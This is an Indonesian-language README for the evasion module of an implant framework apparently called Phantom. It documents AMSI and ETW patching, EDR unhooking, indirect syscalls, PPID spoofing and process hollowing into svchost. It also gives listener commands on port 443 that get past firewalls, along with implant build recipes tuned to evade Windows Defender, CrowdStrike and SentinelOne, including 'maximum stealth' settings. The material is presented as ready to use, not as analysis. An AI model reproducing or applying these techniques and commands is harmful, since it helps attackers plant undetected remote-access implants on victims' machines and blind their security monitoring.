# Evasion Package

Kumpulan teknik AV/EDR evasion untuk implant Phantom. Semua teknik diaktifkan via flag `--evasion` saat generate implant.

## Teknik yang tersedia

| File | Teknik | Efek |
|------|--------|------|
| `amsi_windows.go` | AMSI patch | Blind Windows Defender memory scanning |
| `amsi_windows.go` | ETW patch | Disable EDR telemetry (CrowdStrike, MDE) |
| `evasion_windows.go` | DLL unhooking | Reload ntdll/kernel32/kernelbase dari disk, hapus EDR hooks |
| `sleep_windows.go` | Sleep obfuscation | XOR-encrypt memory saat beacon idle |
| `syscall_windows.go` | Indirect syscalls | Bypass EDR userland hooks via direct NT syscall |
| `ppid_spoof_windows.go` | PPID spoofing | Implant muncul sebagai child dari proses legit |
| `hollow_windows.go` | Process hollowing | Inject shellcode ke proses legit (svchost, explorer) |

## Firewall Bypass

Masalah: mTLS pakai port custom (8888, 31337) yang diblock Windows Firewall.

**Solusi: Pakai HTTPS (port 443)**

```
# Di server console — start HTTPS listener
https --lhost 0.0.0.0 --lport 443

# Generate implant via HTTPS (melewati firewall karena port 443 selalu open)
generate --https <kali-ip>:443 --os windows --arch amd64 --format exe --evasion --obfuscate --save /tmp/
```

Port 443 (HTTPS) hampir tidak pernah diblock karena dipakai browser. Traffic implant terlihat seperti HTTPS biasa.

## Urutan evasion saat startup

```
1. PatchAMSI()          — blind Defender sebelum apapun diload
2. PatchETW()           — disable EDR telemetry
3. RefreshPE(ntdll)     — unhook ntdll dari EDR
4. RefreshPE(kernel32)  — unhook kernel32
5. RefreshPE(kernelbase)— unhook kernelbase
6. InitIndirectSyscalls()— resolve syscall numbers dari disk
7. EnableSleepObfuscation()— aktifkan XOR memory encryption saat sleep
```

## Process Hollowing (inject ke proses legit)

Untuk bypass AV yang monitor proses baru:

```go
// Inject shellcode ke svchost.exe dengan parent spoofed ke explorer.exe
err := evasion.InjectShellcode(shellcodeBytes, 
    `C:\Windows\System32\svchost.exe`, 
    "explorer.exe")
```

## PPID Spoofing standalone

```go
// Spawn notepad.exe tapi parent-nya explorer.exe
proc, err := evasion.SpawnWithSpoofedParent(
    `C:\Windows\System32\notepad.exe`,
    "explorer.exe")
```

## Rekomendasi per skenario

**Windows Defender saja:**
```
generate --https <ip>:443 --os windows --arch amd64 --format exe --evasion --obfuscate
```

**Enterprise EDR (CrowdStrike, SentinelOne):**
```
generate --https <ip>:443 --os windows --arch amd64 --format shellcode \
  --shellcode-encoder shikata-ga-nai --evasion --obfuscate
```

**Maximum stealth:**
```
generate --https <ip>:443 --os windows --arch amd64 --format shellcode \
  --shellcode-encoder shikata-ga-nai --evasion --obfuscate \
  --spoof-metadata C:\Windows\System32\notepad.exe
```
